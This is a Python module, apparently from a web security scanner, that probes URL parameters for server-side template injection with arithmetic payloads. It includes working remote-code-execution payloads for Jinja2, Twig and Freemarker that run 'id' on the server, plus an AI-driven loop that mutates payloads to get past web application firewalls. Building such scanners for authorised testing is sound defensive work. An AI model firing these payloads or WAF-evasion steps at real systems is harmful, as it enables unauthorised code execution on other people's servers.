"""
cyberm4fia-scanner - Server-Side Template Injection (SSTI) Scanner
Detects Jinja2, Twig, Mako, Smarty, Freemarker, Pebble template injection
"""

from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from utils.colors import log_info, log_success
from utils.request import smart_request
from utils.request import ScanExceptions

# ─────────────────────────────────────────────────────
# SSTI Payloads — each has a unique expected output
# ─────────────────────────────────────────────────────
SSTI_PAYLOADS = [
    # Jinja2 / Twig (Python / PHP)
    {"payload": "{{7*7}}", "expect": "49", "engine": "Jinja2/Twig"},
    {"payload": "{{7*'7'}}", "expect": "7777777", "engine": "Jinja2 (Python)"},
    {"payload": "${7*7}", "expect": "49", "engine": "Freemarker/Mako"},
    {"payload": "#{7*7}", "expect": "49", "engine": "Ruby ERB / Java EL"},
    {"payload": "<%= 7*7 %>", "expect": "49", "engine": "ERB / ASP"},
    {"payload": "{7*7}", "expect": "49", "engine": "Smarty"},
    {"payload": "{{config}}", "expect": "Config", "engine": "Jinja2 (Flask)"},
    # Math-based confirmation payloads
    {"payload": "{{4*4*4*4}}", "expect": "256", "engine": "Jinja2/Twig"},
    {"payload": "${4*4*4*4}", "expect": "256", "engine": "Freemarker/Mako"},
    {"payload": "#{4*4*4*4}", "expect": "256", "engine": "Java EL"},
]

# RCE escalation payloads (after detection, for evidence)
SSTI_RCE_PAYLOADS = {
    "Jinja2 (Python)": [
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
    ],
    "Jinja2/Twig": [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    ],
    "Freemarker/Mako": [
        '${"freemarker.template.utility.Execute"?new()("id")}',
    ],
}

def inject_payload(url, param, payload, delay, method="get"):
    """Inject SSTI payload into a URL parameter."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    if param not in params:
        params[param] = [""]

    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    test_url = urlunparse(parsed._replace(query=new_query))

    try:
        if method == "get":
            resp = smart_request("get", test_url, delay=delay, timeout=8)
        else:
            data = {param: payload}
            resp = smart_request("post", url, data=data, delay=delay, timeout=8)

        return resp.text, resp.status_code
    except ScanExceptions:
        return None, None

def scan_ssti(url, delay=0):
    """Scan URL for SSTI vulnerabilities."""
    log_info(f"Starting SSTI scan on {url}")
    findings = []

    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    if not params:
        log_info("No parameters found for SSTI testing")
        return findings

    for param in params:
        log_info(f"Testing parameter: {param}")
        param_found = False
        waf_blocked = False

        for entry in SSTI_PAYLOADS:
            payload = entry["payload"]
            expected = entry["expect"]
            engine = entry["engine"]

            body, status = inject_payload(url, param, payload, delay)
            if body is None:
                continue

            # Track WAF blocks for AI bypass later
            if status in (403, 406, 429, 503):
                waf_blocked = True

            # Check if the mathematical result appears in response
            if expected in body:
                # Verify it's not already in the normal page
                clean_body, _ = inject_payload(
                    url, param, "harmless_test_string", delay
                )
                if clean_body and expected not in clean_body:
                    finding = {
                        "type": "SSTI",
                        "url": url,
                        "field": param,
                        "payload": payload,
                        "engine": engine,
                        "evidence": f"Response contains '{expected}'",
                        "severity": "CRITICAL",
                        "description": (
                            f"Server-Side Template Injection in '{param}' parameter. "
                            f"Engine: {engine}. This can lead to Remote Code Execution."
                        ),
                    }
                    findings.append(finding)
                    log_success(
                        f"[CRITICAL] SSTI found! Param: {param} | "
                        f"Engine: {engine} | Payload: {payload}"
                    )
                    param_found = True
                    break  # One confirmed finding per param is enough

        # ── AI WAF Bypass for this param ──
        if not param_found and waf_blocked:
            try:
                from utils.ai import get_ai, EvolvingWAFBypassEngine
                from utils.waf import waf_detector

                ai_client = get_ai()
                waf_name = getattr(waf_detector, "detected_waf", "") or ""
                if ai_client and ai_client.available and waf_name:
                    log_info(f"AI WAF Bypass: SSTI on {param} (WAF: {waf_name})")
                    engine_ai = EvolvingWAFBypassEngine(ai_client, waf_name, "SSTI")
                    base_payload = "{{7*7}}"

                    for iteration in range(1, 4):
                        ai_payloads = engine_ai.mutate(base_payload, iteration)
                        for ai_p in ai_payloads:
                            body, status = inject_payload(url, param, ai_p, delay)
                            if body and "49" in body:
                                clean_body, _ = inject_payload(
                                    url, param, "harmless_test_string", delay
                                )
                                if clean_body and "49" not in clean_body:
                                    findings.append({
                                        "type": "SSTI",
                                        "url": url,
                                        "field": param,
                                        "payload": ai_p,
                                        "engine": "AI WAF Bypass",
                                        "evidence": "Response contains '49' (WAF bypassed)",
                                        "severity": "CRITICAL",
                                        "description": (
                                            f"SSTI in '{param}' via AI WAF bypass "
                                            f"(Gen-{iteration}). WAF: {waf_name}"
                                        ),
                                    })
                                    log_success(
                                        f"[CRITICAL] SSTI WAF bypass! Param: {param} | "
                                        f"Gen-{iteration}"
                                    )
                                    param_found = True
                                    break
                            elif body and status not in (403, 406, 429, 503):
                                engine_ai.analyze_failure(ai_p)
                        if param_found:
                            break
            except (ImportError, ScanExceptions):
                pass

    # ── AI Exploit Agent (Final Escalation) ──
    if not findings and params:
        try:
            from utils.ai_exploit_agent import get_exploit_agent, ExploitContext
            agent = get_exploit_agent()
            if agent and agent.available:
                from utils.waf import waf_detector
                waf_name = getattr(waf_detector, "detected_waf", "") or ""

                for param in params:
                    ctx = ExploitContext(
                        url=url,
                        param=param,
                        vuln_type="SSTI",
                        waf=waf_name,
                        http_method="GET",
                    )
                    result = agent.exploit_ssti(ctx)
                    if result and result.success:
                        findings.append({
                            "type": "SSTI",
                            "url": url,
                            "field": param,
                            "payload": result.payload,
                            "engine": "AI-detected",
                            "evidence": result.evidence[:200],
                            "severity": "CRITICAL",
                            "description": (
                                f"AI-discovered SSTI in '{param}' parameter. "
                                f"Confidence: {result.confidence:.0f}%"
                            ),
                            "source": f"AI Agent (Gen-{result.iteration})",
                            "ai_curl": result.curl_command,
                            "ai_poc_script": result.python_script,
                            "ai_nuclei": result.nuclei_template,
                        })
                        log_success(
                            f"[CRITICAL] SSTI in: {param} "
                            f"[AI Agent Gen-{result.iteration}]"
                        )
                        break
        except ImportError:
            pass

    log_success(f"SSTI scan complete. Found {len(findings)} vulnerability(ies).")
    return findings
